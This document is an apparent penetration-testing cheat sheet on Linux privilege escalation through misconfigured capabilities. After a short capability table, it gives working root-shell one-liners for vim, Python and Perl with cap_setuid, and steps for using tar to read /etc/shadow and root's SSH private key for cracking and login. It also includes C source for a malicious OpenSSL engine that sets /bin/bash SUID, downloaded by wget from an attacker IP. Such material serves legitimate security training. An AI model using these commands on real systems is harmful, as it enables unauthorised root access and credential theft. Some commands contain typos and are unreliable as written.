# Linux Capabilities
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the getcap tool to list enabled capabilities.
```
getcap -r \ 2>/dev/null
```
## 📝List of Capability
On the basis of functionality, the capability is categorized into total 36 in the count. Some of the majorly used are shown below.
```
Capabilities Name 			Description 
CAP_AUDIT_CONTROL 			Allow to enable and disable kernel auditing. 
CAP_AUDIT_WRITE 			Helps to write records to kernel auditing log. 
CAP_BLOCK_SUSPEND 			This feature can block system suspend. 
CAP_CHOWN 				Allow user to make arbitrary changes to file UIDs and GIDs. 
CAP_DAC_OVERRIDE 			This helps to bypass file read, write, and execute permission checks. 
CAP_DAC_READ_SEARCH 			This only bypass file and directory read/execute permission checks. 
CAP_FOWNER 				This enables to bypass permission checks on operations that normally require the file system UID of the process to match the 
WWWAH 					UID of the file. 
CAP_KILL 				Allow the sending of signals to processes belonging to others 
CAP_SETGID 				Allow changing of the GID 
CAP_SETUID 				Allow changing of the UID 
CAP_SETPCAP 				Helps to transferring and removal of current set to any PID. 
CAP_IPC_LOCK 				This helps to Lock memory 
CAP_MAC_ADMIN 				Allow MAC configuration or state changes. 
CAP_NET_RAW 				Use RAW and PACKET sockets; And helps to bind any address for transparent proxying. 
CAP_NET_BIND_SERVICE 			SERVICE Bind a socket to Internet domain privileged ports
```
GTFObins [https://gtfobins.github.io/#] has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

## 📌Privilege Escalation using vim= cap_setuid+ep Capabilitie
**Step-1:** Run getcap command to list capabilities
```
getcap -r / 2>/dev/null
```
Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.
**Step-2:** Search GTFObins to it's exploit. We notice that vim can be used with the following command and payload:
```
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
Launch the payload and a root shell.

## 📌Python
```
getcap -r / 2>/dev/null         
/usr/bin/python2.6 = cap_setuid+ep
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

OR

getcap -r / 2>/dev/null  
/usr/bin/python3 = cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami
```

## 📌Perl
```
getcap -r / 2>/dev/null         
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
id && whoami
```

## 📌Tar

### Method-1️⃣:
```
Victim

getcap -r / 2>/dev/null         
/usr/bin/tar = cap dac read search+ep
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow
Copy content of users accounts to a local file called shadow

Attacker

john shadow --wordlist=/usr/share/wordlists/rockyou.txt
Crack root's credentials

Victim

su root
id && whoami
```
### Method-2️⃣:
```
Victim

getcap -r / 2>/dev/null         
/usr/bin/tar = cap dac read search+ep
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
cat id_rsa
# Download id_rsa to attacker machine

Attacker

chmod 600 id_rsa
ssh -i id_rsa root@<victim_ip>
id && whoami
```

## 📌OpenSSL

### 🎯Victim:
```
getcap -r / 2>/dev/null         
/usr/bin/openssl = cap_setuid+ep
```
### 💀Attacker Create a .so file - Code below vi priv.c
```
#include <openssl/engine.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static const char *engine_id = "test";
static const char *engine_name = "hope it works";

static int bind(ENGINE *e, const char *id)
{
  int ret = 0;

  if (!ENGINE_set_id(e, engine_id)) {
    fprintf(stderr, "ENGINE_set_id failed\n");
    goto end;
  }
  if (!ENGINE_set_name(e, engine_name)) {
    printf("ENGINE_set_name failed\n");
    goto end;
  }
  setuid(0);
  setgid(0);
  system("chmod +s /bin/bash");    
  system("echo Complete!");
  ret = 1;
 end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
Compile Code & Create .so file
```
gcc -c fPIC priv.c -o priv
gcc -shared -o priv.so -lcrypto priv
```
### 🎯Victim: Download .so from Attacker
```
wget -O /tmp/priv.so http://10.10.10.10:9000/priv.so
// Replace IP & Port
```
### 💀 Attacker: Get Root
```
openssl req -engine /tmp/priv.so
/bin/bash -p
id && whoami
```

# 🔍Resources
If you want to see the other capabilities to escalate your privilege then check these articals:

- https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#capabilities
